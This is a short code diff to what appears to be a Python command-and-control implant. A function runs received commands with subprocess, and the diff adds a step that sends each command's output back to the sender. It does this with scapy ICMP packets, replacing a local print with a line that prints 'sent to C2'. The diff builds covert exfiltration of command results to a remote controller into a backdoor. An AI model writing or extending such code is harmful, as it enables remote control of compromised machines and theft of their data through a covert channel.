@@ -39,11 +39,13 @@ def cmd_proc(cmd, source):
             result = sp.run(cmd, capture_output=True)
             if result.check_returncode() is None and verbose:
                 print(result.stdout.decode())
+            send_output(result.stdout.decode(), source)
         elif term == "s":
             print("This taps into the stored commands")
 
 def send_output(stdout, sender):
-    print(stdout + ' \n \n \n' + sender)
+    send(IP(dst=sender)/ICMP()/stdout)
+    print("sent to C2")
 
 
 
